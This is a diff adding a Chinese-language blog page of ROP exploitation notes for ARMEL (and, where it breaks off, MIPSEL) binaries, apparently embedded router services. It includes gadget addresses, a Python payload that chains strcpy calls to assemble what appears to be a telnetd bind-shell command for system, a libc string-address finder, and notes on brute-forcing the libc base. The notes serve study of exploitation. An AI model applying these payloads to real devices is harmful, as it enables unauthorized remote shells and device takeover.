@@ -1,0 +1,926 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="zh-CN" xml:lang="zh-CN"><head>
+
+<meta charset="utf-8">
+<meta name="generator" content="quarto-1.9.37">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+
+
+<title>ARMEL 与 MIPSEL ROP 笔记 – Shuangning Yang</title>
+<style>
+/* Default styles provided by pandoc.
+** See https://pandoc.org/MANUAL.html#variables-for-html for config info.
+*/
+code{white-space: pre-wrap;}
+span.smallcaps{font-variant: small-caps;}
+div.columns{display: flex; gap: min(4vw, 1.5em);}
+div.column{flex: auto; overflow-x: auto;}
+div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+ul.task-list{list-style: none;}
+ul.task-list li input[type="checkbox"] {
+  width: 0.8em;
+  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
+  vertical-align: middle;
+}
+/* CSS for syntax highlighting */
+html { -webkit-text-size-adjust: 100%; }
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+  }
+pre.numberSource { margin-left: 3em;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+</style>
+
+
+<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
+<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
+<script src="../../site_libs/clipboard/clipboard.min.js"></script>
+<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
+<script src="../../site_libs/quarto-search/fuse.min.js"></script>
+<script src="../../site_libs/quarto-search/quarto-search.js"></script>
+<meta name="quarto:offset" content="../../">
+<link href="../../images/logo.png" rel="icon" type="image/png">
+<script src="../../site_libs/quarto-html/quarto.js" type="module"></script>
+<script src="../../site_libs/quarto-html/tabsets/tabsets.js" type="module"></script>
+<script src="../../site_libs/quarto-html/popper.min.js"></script>
+<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
+<script src="../../site_libs/quarto-html/anchor.min.js"></script>
+<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
+<link href="../../site_libs/quarto-html/quarto-syntax-highlighting-a9c94084e156453ce75ecc8ff7b2041c.css" rel="stylesheet" id="quarto-text-highlighting-styles">
+<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
+<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
+<link href="../../site_libs/bootstrap/bootstrap-d86b5db1ca31100997438474e5969711.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="light">
+<script id="quarto-search-options" type="application/json">{
+  "location": "navbar",
+  "copy-button": false,
+  "collapse-after": 3,
+  "panel-placement": "end",
+  "type": "overlay",
+  "limit": 50,
+  "keyboard-shortcut": [
+    "f",
+    "/",
+    "s"
+  ],
+  "show-item-context": false,
+  "language": {
+    "search-no-results-text": "没有结果",
+    "search-matching-documents-text": "匹配的文档",
+    "search-copy-link-title": "复制搜索链接",
+    "search-hide-matches-text": "隐藏其它匹配结果",
+    "search-more-match-text": "更多匹配结果",
+    "search-more-matches-text": "更多匹配结果",
+    "search-clear-button-title": "清除",
+    "search-text-placeholder": "",
+    "search-detached-cancel-button-title": "取消",
+    "search-submit-button-title": "提交",
+    "search-label": "搜索"
+  }
+}</script>
+
+
+<link rel="stylesheet" href="../decompilation/code-blocks.css">
+</head>
+
+<body class="nav-fixed quarto-light">
+
+<div id="quarto-search-results"></div>
+  <header id="quarto-header" class="headroom fixed-top">
+    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
+      <div class="navbar-container container-fluid">
+      <div class="navbar-brand-container mx-auto">
+    <a class="navbar-brand" href="../../index.html">
+    <span class="navbar-title">Shuangning Yang</span>
+    </a>
+  </div>
+            <div id="quarto-search" class="" title="搜索"></div>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="展开或折叠导航栏" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
+  <span class="navbar-toggler-icon"></span>
+</button>
+          <div class="collapse navbar-collapse" id="navbarCollapse">
+            <ul class="navbar-nav navbar-nav-scroll ms-auto">
+  <li class="nav-item">
+    <a class="nav-link" href="../../index.html"> 
+<span class="menu-text">Home</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../../publications.html"> 
+<span class="menu-text">Publications</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../../blogs.html"> 
+<span class="menu-text">Blogs</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../../codes.html"> 
+<span class="menu-text">Codes</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../../CV.pdf"> 
+<span class="menu-text">CV</span></a>
+  </li>  
+</ul>
+          </div> <!-- /navcollapse -->
+            <div class="quarto-navbar-tools">
+</div>
+      </div> <!-- /container-fluid -->
+    </nav>
+</header>
+<!-- content -->
+<div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
+<!-- sidebar -->
+<!-- margin-sidebar -->
+    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
+        <nav id="TOC" role="doc-toc" class="toc-active">
+    <h2 id="toc-title">目录</h2>
+   
+  <ul>
+  <li><a href="#arch-armel" id="toc-arch-armel" class="nav-link active" data-scroll-target="#arch-armel">arch = armel</a>
+  <ul class="collapse">
+  <li><a href="#无截断-rop" id="toc-无截断-rop" class="nav-link" data-scroll-target="#无截断-rop">无截断 ROP</a></li>
+  <li><a href="#有截断-rop" id="toc-有截断-rop" class="nav-link" data-scroll-target="#有截断-rop">有截断 ROP</a></li>
+  <li><a href="#程序中没有-system" id="toc-程序中没有-system" class="nav-link" data-scroll-target="#程序中没有-system">程序中没有 system</a></li>
+  <li><a href="#arm-ret2dlresolve" id="toc-arm-ret2dlresolve" class="nav-link" data-scroll-target="#arm-ret2dlresolve">ARM ret2dlresolve</a></li>
+  <li><a href="#其他-gadget" id="toc-其他-gadget" class="nav-link" data-scroll-target="#其他-gadget">其他 gadget</a></li>
+  <li><a href="#shellcode" id="toc-shellcode" class="nav-link" data-scroll-target="#shellcode">Shellcode</a></li>
+  <li><a href="#其他注意事项" id="toc-其他注意事项" class="nav-link" data-scroll-target="#其他注意事项">其他注意事项</a></li>
+  </ul></li>
+  <li><a href="#arch-mipsel" id="toc-arch-mipsel" class="nav-link" data-scroll-target="#arch-mipsel">arch = mipsel</a>
+  <ul class="collapse">
+  <li><a href="#无截断-rop-1" id="toc-无截断-rop-1" class="nav-link" data-scroll-target="#无截断-rop-1">无截断 ROP</a></li>
+  <li><a href="#有截断-rop-1" id="toc-有截断-rop-1" class="nav-link" data-scroll-target="#有截断-rop-1">有截断 ROP</a></li>
+  </ul></li>
+  </ul>
+<div class="toc-actions"><ul><li><a href="https://github.com/yangshuangning/yangshuangning.github.io/edit/main/posts/arm-mips-rop/index.qmd" class="toc-action"><i class="bi bi-github"></i>编辑该页面</a></li><li><a href="https://github.com/yangshuangning/yangshuangning.github.io/issues/new" class="toc-action"><i class="bi empty"></i>反馈问题</a></li></ul></div></nav>
+    </div>
+<!-- main -->
+<main class="content" id="quarto-document-content">
+
+<header id="title-block-header" class="quarto-title-block default">
+<div class="quarto-title">
+<h1 class="title">ARMEL 与 MIPSEL ROP 笔记</h1>
+</div>
+
+
+
+<div class="quarto-title-meta">
+
+    
+  
+    
+  </div>
+  
+
+
+</header>
+
+
+<p>本文整理 ARMEL 与 MIPSEL 架构下的 ROP 学习笔记，按输入是否受空字节截断影响分类。示例中的地址、偏移和运行环境来自原笔记；代码保留原有逻辑与字符串写法，是依赖具体程序环境的片段。</p>
+<section id="arch-armel" class="level2">
+<h2 class="anchored" data-anchor-id="arch-armel">arch = armel</h2>
+<section id="无截断-rop" class="level3">
+<h3 class="anchored" data-anchor-id="无截断-rop">无截断 ROP</h3>
+<p>对于原笔记中由 <code>memcpy</code> 造成、输入没有截断的栈溢出，可以构造 ROP 链。</p>
+<p>寻找程序里的 <code>system</code>、<code>popen</code> 等调用片段，先找能够将栈上数据传入 <code>R0</code> 的 gadget。</p>
+<ul>
+<li><code>rop_gadget1</code>：只需将 <code>command</code> 放到栈上。</li>
+<li><code>rop_gadget2</code>：需要寻找可控地址存放 <code>command</code>。这一方法也可用于有截断的溢出，但需要找到不包含 <code>\x00</code> 的 4 字节可控地址。</li>
+</ul>
+<div class="code-with-filename">
+<div class="code-with-filename-file">
+<pre><strong>ARMEL · 函数返回与 system 调用片段</strong></pre>
+</div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb1" data-filename="ARMEL · 函数返回与 system 调用片段"><pre class="sourceCode asm code-with-copy"><code class="sourceCode fasm"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">; func return</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0001CFAC    <span class="bu">ADD</span>    <span class="kw">SP</span><span class="op">,</span> <span class="kw">SP</span><span class="op">,</span> <span class="op">#</span><span class="bn">0x6C</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0001CFB0    <span class="bu">POP</span>    <span class="op">{</span>R4<span class="op">-</span><span class="kw">R11</span><span class="op">,</span>PC<span class="op">}</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="co">; rop_gadget1</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0009868C    <span class="bu">MOV</span>    R0<span class="op">,</span> <span class="kw">SP</span>  <span class="co">; command</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>00098690    BL     system</span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="co">; rop_gadget2</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0001A83C    <span class="bu">MOV</span>    R0<span class="op">,</span> R4  <span class="co">; command</span></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0001A840    BL     system</span></code></pre></div><button title="复制到剪贴板" class="code-copy-button"><i class="bi"></i></button></div>
+</div>
+</section>
+<section id="有截断-rop" class="level3">
+<h3 class="anchored" data-anchor-id="有截断-rop">有截断 ROP</h3>
+<p>使用 <code>strcpy</code>、<code>strncpy</code>、<code>sprintf</code>、<code>sscanf</code>、<code>strcat</code> 等字符串处理函数时，需要关注 <code>\x00</code> 对输入和复制过程的影响。具体截断行为取决于函数、参数和数据路径。</p>
+<section id="栈上可控的-r0" class="level4">
+<h4 class="anchored" data-anchor-id="栈上可控的-r0">栈上可控的 R0</h4>
+<p>函数返回时，检查 <code>R0</code> 寄存器是否可控；原笔记中的思路是直接覆盖为 <code>system_addr</code>。</p>
+</section>
+<section id="调整栈帧的-gadget" class="level4">
+<h4 class="anchored" data-anchor-id="调整栈帧的-gadget">调整栈帧的 gadget</h4>
+<p>当溢出点是栈上数据拷贝到栈上数据时，可以通过调整栈指针，将栈迁移到上一层函数的栈空间。事先布置好栈中的 ROP 链，在栈溢出时调用操作栈的指令。</p>
+<div class="code-with-filename">
+<div class="code-with-filename-file">
+<pre><strong>ARMEL · 调整 SP 与 strcpy 片段</strong></pre>
+</div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb2" data-filename="ARMEL · 调整 SP 与 strcpy 片段"><pre class="sourceCode asm code-with-copy"><code class="sourceCode fasm"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co">; 有截断：在溢出前将 ROP 放到栈上，通过调整 SP 劫持 PC</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="co">; gadget</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>000230f0    <span class="bu">ADD</span>    <span class="kw">SP</span><span class="op">,</span> <span class="kw">SP</span><span class="op">,</span> <span class="op">#</span><span class="bn">0x20c</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>000230f4    <span class="bu">ADD</span>    <span class="kw">SP</span><span class="op">,</span> <span class="kw">SP</span><span class="op">,</span> <span class="op">#</span><span class="bn">0x1000</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>000230f8    LDMFD  <span class="kw">SP</span><span class="op">!,</span> <span class="op">{</span>R4<span class="op">-</span><span class="kw">R11</span><span class="op">,</span>PC<span class="op">}</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="co">; strcpy gadget：目标地址和源地址由寄存器提供</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>00013644    <span class="bu">MOV</span>    R0<span class="op">,</span> <span class="kw">R10</span>  <span class="co">; dest</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>00013648    <span class="bu">MOV</span>    R1<span class="op">,</span> R5   <span class="co">; src</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>0001364C    BL     strcpy</span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>00013650    <span class="bu">MOV</span>    R0<span class="op">,</span> R4</span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>00013654    <span class="bu">ADD</span>    <span class="kw">SP</span><span class="op">,</span> <span class="kw">SP</span><span class="op">,</span> <span class="op">#</span><span class="bn">0x5C</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a><span class="fu">.text:</span>00013658    LDMFD  <span class="kw">SP</span><span class="op">!,</span> <span class="op">{</span>R4<span class="op">-</span><span class="kw">R8</span><span class="op">,</span><span class="kw">R10</span><span class="op">,</span>PC<span class="op">}</span></span></code></pre></div><button title="复制到剪贴板" class="code-copy-button"><i class="bi"></i></button></div>
+</div>
+</section>
+<section id="将-shellcode-放到堆上" class="level4">
+<h4 class="anchored" data-anchor-id="将-shellcode-放到堆上">将 shellcode 放到堆上</h4>
+<p>原笔记记录的思路：当 ASLR 设置为 <code>1</code>，且输入数据存放到堆上时，考虑将 shellcode 放在堆上。是否可行仍取决于具体运行环境。</p>
+</section>
+<section id="碰撞-libc-基址" class="level4">
+<h4 class="anchored" data-anchor-id="碰撞-libc-基址">碰撞 libc 基址</h4>
+<p>当溢出点是堆上数据拷贝到栈上数据时，原笔记考虑在进程崩溃不影响其他功能的场景（例如特定 <code>.cgi</code> 程序）尝试碰撞 libc 基址。</p>
+<p>调用 libc 函数时，还需要关注 <code>LR</code> 中的返回地址及函数返回路径。原笔记使用如下 <code>lr_gadget</code> 和 <code>pop_gadget</code> 组合组织连续调用：</p>
+<div class="code-with-filename">
+<div class="code-with-filename-file">
+<pre><strong>ARMEL · 原笔记中的 libc gadget 偏移</strong></pre>
+</div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb3" data-filename="ARMEL · 原笔记中的 libc gadget 偏移"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>pop_gadget <span class="op">=</span> libc_addr <span class="op">+</span> <span class="bn">0x000fd524</span>  <span class="co"># pop {r0, r1, r2, r3, pc}</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>lr_gadget <span class="op">=</span> libc_addr <span class="op">+</span> <span class="bn">0x00038a40</span>   <span class="co"># pop {lr} ; add sp, sp, #4 ; bx lr</span></span></code></pre></div><button title="复制到剪贴板" class="code-copy-button"><i class="bi"></i></button></div>
+</div>
+<p>Payload 示例：</p>
+<div class="code-with-filename">
+<div class="code-with-filename-file">
+<pre><strong>ARMEL · 原始 payload 片段</strong></pre>
+</div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb4" data-filename="ARMEL · 原始 payload 片段"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>buf <span class="op">=</span> <span class="st">'A'</span> <span class="op">*</span> (<span class="bn">0x34</span>)</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> p32(lr_gadget) <span class="op">+</span> p32(pop_gadget) <span class="op">+</span> <span class="st">"a"</span> <span class="op">*</span> <span class="dv">4</span>  <span class="co"># PC</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> p32(command_addr) <span class="op">+</span> p32(tel_addr) <span class="op">+</span> <span class="st">"A"</span> <span class="op">*</span> <span class="dv">8</span> <span class="op">+</span> p32(strcpy_addr)</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> p32(command_addr <span class="op">+</span> <span class="dv">3</span>) <span class="op">+</span> p32(net_addr) <span class="op">+</span> <span class="st">"B"</span> <span class="op">*</span> <span class="dv">8</span> <span class="op">+</span> p32(strcpy_addr)</span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> p32(command_addr <span class="op">+</span> <span class="dv">6</span>) <span class="op">+</span> p32(d_addr) <span class="op">+</span> <span class="st">"C"</span> <span class="op">*</span> <span class="dv">8</span> <span class="op">+</span> p32(strcpy_addr)</span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> p32(command_addr) <span class="op">+</span> <span class="st">"D"</span> <span class="op">*</span> <span class="dv">8</span> <span class="op">+</span> p32(system_addr)</span></code></pre></div><button title="复制到剪贴板" class="code-copy-button"><i class="bi"></i></button></div>
+</div>
+</section>
+</section>
+<section id="程序中没有-system" class="level3">
+<h3 class="anchored" data-anchor-id="程序中没有-system">程序中没有 system</h3>
+<p>可以考虑 <code>libc.so</code> 中的 <code>system</code> 地址。原笔记通过以下命令查看地址随机化设置：</p>
+<div class="code-with-filename">
+<div class="code-with-filename-file">
+<pre><strong>查看 ASLR 设置</strong></pre>
+</div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb5" data-filename="查看 ASLR 设置"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /proc/sys/kernel/randomize_va_space</span></code></pre></div><button title="复制到剪贴板" class="code-copy-button"><i class="bi"></i></button></div>
+</div>
+<p>原笔记记录：在其测试环境中，<code>randomize_va_space</code> 为 <code>1</code> 时，重启进程后 <code>libc_addr</code> 发生变化，而观察到的 <code>heap_addr</code> 没有变化。下面的记录展示了两次运行中的 libc 映射；这些记录不应直接视为所有系统和进程都具备的地址规律。</p>
+<div class="code-with-filename">
+<div class="code-with-filename-file">
+<pre><strong>原测试环境 · 重启前后的内存映射</strong></pre>
+</div>
+<pre class="text" data-filename="原测试环境 · 重启前后的内存映射"><code># cat /proc/`pidof upnpd`/maps | grep libc.so
+40023000-40028000 r-xp 00000000 1f:03 139        /lib/ld-uClibc.so.0
+4002f000-40030000 r--p 00004000 1f:03 139        /lib/ld-uClibc.so.0
+40030000-40031000 rw-p 00005000 1f:03 139        /lib/ld-uClibc.so.0
+40363000-403c8000 r-xp 00000000 1f:03 278        /lib/libc.so.0
+403d0000-403d1000 r--p 00065000 1f:03 278        /lib/libc.so.0
+403d1000-403d2000 rw-p 00066000 1f:03 278        /lib/libc.so.0
+# killall upnpd
+# upnpd
+# cat /proc/`pidof upnpd`/maps | grep libc.so
+4003e000-40043000 r-xp 00000000 1f:03 139        /lib/ld-uClibc.so.0
+4004a000-4004b000 r--p 00004000 1f:03 139        /lib/ld-uClibc.so.0
+4004b000-4004c000 rw-p 00005000 1f:03 139        /lib/ld-uClibc.so.0
+40340000-403a5000 r-xp 00000000 1f:03 278        /lib/libc.so.0
+403ad000-403ae000 r--p 00065000 1f:03 278        /lib/libc.so.0
+403ae000-403af000 rw-p 00066000 1f:03 278        /lib/libc.so.0</code></pre>
+</div>
+<p>原笔记还记录：<code>randomize_va_space</code> 为 <code>0</code> 时，其测试进程重启前后的 <code>libc_addr</code> 没有变化。</p>
+</section>
+<section id="arm-ret2dlresolve" class="level3">
+<h3 class="anchored" data-anchor-id="arm-ret2dlresolve">ARM ret2dlresolve</h3>
+<p><em>原笔记仅列出此主题，未附具体内容。</em></p>
+</section>
+<section id="其他-gadget" class="level3">
+<h3 class="anchored" data-anchor-id="其他-gadget">其他 gadget</h3>
+<ul>
+<li>重置 <code>http_password</code> 的 gadget。</li>
+<li>开启其他功能的 gadget。</li>
+</ul>
+</section>
+<section id="shellcode" class="level3">
+<h3 class="anchored" data-anchor-id="shellcode">Shellcode</h3>
+<p><em>原笔记仅列出此主题，未附具体内容。</em></p>
+</section>
+<section id="其他注意事项" class="level3">
+<h3 class="anchored" data-anchor-id="其他注意事项">其他注意事项</h3>
+<ol type="1">
+<li>栈溢出如果覆盖了栈上的环境变量（如 <code>PATH=/bin;</code>），执行 <code>system</code> 时可能出现异常。</li>
+<li>当 <code>command</code> 难以直接输入时，原笔记使用 libc 或程序内部的字符串地址，结合 <code>strcpy_gadget</code> 拼接命令。</li>
+</ol>
+<div class="code-with-filename">
+<div class="code-with-filename-file">
+<pre><strong>ARMEL · 原笔记中的字符串地址查找片段</strong></pre>
+</div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb7" data-filename="ARMEL · 原笔记中的字符串地址查找片段"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>libc_path <span class="op">=</span> <span class="st">'./lib/libc-2.13.so'</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>libc <span class="op">=</span> ELF(libc_path)</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>libc_addr <span class="op">=</span> <span class="bn">0xb6e8d000</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> getStrAddr(s):</span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>    off <span class="op">=</span> libc.search(s)</span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>    str_addr <span class="op">=</span> <span class="dv">0</span></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> i <span class="kw">in</span> off:</span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>        <span class="co"># print(hex(i))</span></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>        str_addr <span class="op">=</span> libc_addr <span class="op">+</span> i</span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (str_addr <span class="op">&amp;</span> <span class="bn">0xffff</span>) <span class="op">&gt;&gt;</span> <span class="dv">8</span> <span class="op">!=</span> <span class="bn">0xd</span> <span class="kw">and</span> (str_addr <span class="op">&amp;</span> <span class="bn">0xffff</span>) <span class="op">&gt;&gt;</span> <span class="dv">8</span> <span class="op">!=</span> <span class="bn">0xa</span> <span class="kw">and</span> <span class="op">\</span></span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>            ((str_addr <span class="op">&amp;</span> <span class="bn">0xffff</span>) <span class="op">&gt;&gt;</span> <span class="dv">8</span> <span class="op">&gt;</span> <span class="bn">0x7a</span> <span class="kw">or</span> (str_addr <span class="op">&amp;</span> <span class="bn">0xffff</span>) <span class="op">&gt;&gt;</span> <span class="dv">8</span> <span class="op">&lt;</span> <span class="bn">0x61</span>) <span class="kw">and</span> <span class="op">\</span></span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a>            ((str_addr <span class="op">&amp;</span> <span class="bn">0xff</span>) <span class="op">&gt;</span> <span class="bn">0x7a</span> <span class="kw">or</span> (str_addr <span class="op">&amp;</span> <span class="bn">0xff</span>) <span class="op">&lt;</span> <span class="bn">0x61</span>) <span class="kw">and</span> <span class="op">\</span></span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a>            (str_addr <span class="op">&amp;</span> <span class="bn">0xff</span>) <span class="op">!=</span> <span class="bn">0xd</span> <span class="kw">and</span> (str_addr <span class="op">&amp;</span> <span class="bn">0xff</span>) <span class="op">!=</span> <span class="bn">0xa</span> <span class="kw">and</span> (str_addr <span class="op">&amp;</span> <span class="bn">0xff</span>) <span class="op">!=</span> <span class="bn">0x3d</span>:</span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span></span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a>    <span class="co"># print('{} addr is {:#x}'.format(s, str_addr))</span></span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> str_addr</span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-21"><a href="#cb7-21" aria-hidden="true" tabindex="-1"></a>tel_addr <span class="op">=</span> getStrAddr(<span class="st">'tel</span><span class="ch">\x00</span><span class="st">'</span>)</span>
+<span id="cb7-22"><a href="#cb7-22" aria-hidden="true" tabindex="-1"></a>net_addr <span class="op">=</span> getStrAddr(<span class="st">'net</span><span class="ch">\x00</span><span class="st">'</span>)</span>
+<span id="cb7-23"><a href="#cb7-23" aria-hidden="true" tabindex="-1"></a>d_addr <span class="op">=</span> getStrAddr(<span class="st">'d</span><span class="ch">\x00</span><span class="st">'</span>)</span>
+<span id="cb7-24"><a href="#cb7-24" aria-hidden="true" tabindex="-1"></a>kong_addr <span class="op">=</span> getStrAddr(<span class="st">' </span><span class="ch">\x00</span><span class="st">'</span>)</span>
+<span id="cb7-25"><a href="#cb7-25" aria-hidden="true" tabindex="-1"></a>gang_addr <span class="op">=</span> getStrAddr(<span class="st">'-</span><span class="ch">\x00</span><span class="st">'</span>)</span>
+<span id="cb7-26"><a href="#cb7-26" aria-hidden="true" tabindex="-1"></a>p_addr <span class="op">=</span> getStrAddr(<span class="st">'p</span><span class="ch">\x00</span><span class="st">'</span>)</span>
+<span id="cb7-27"><a href="#cb7-27" aria-hidden="true" tabindex="-1"></a>port_addr <span class="op">=</span> getStrAddr(<span class="st">'6789</span><span class="ch">\x00</span><span class="st">'</span>)</span>
+<span id="cb7-28"><a href="#cb7-28" aria-hidden="true" tabindex="-1"></a>l_addr <span class="op">=</span> getStrAddr(<span class="st">'l</span><span class="ch">\x00</span><span class="st">'</span>)</span>
+<span id="cb7-29"><a href="#cb7-29" aria-hidden="true" tabindex="-1"></a>binsh_addr <span class="op">=</span> getStrAddr(<span class="st">'/bin/sh</span><span class="ch">\x00</span><span class="st">'</span>)</span>
+<span id="cb7-30"><a href="#cb7-30" aria-hidden="true" tabindex="-1"></a>fenhao_addr <span class="op">=</span> getStrAddr(<span class="st">';</span><span class="ch">\x00</span><span class="st">'</span>)</span></code></pre></div><button title="复制到剪贴板" class="code-copy-button"><i class="bi"></i></button></div>
+</div>
+</section>
+</section>
+<section id="arch-mipsel" class="level2">
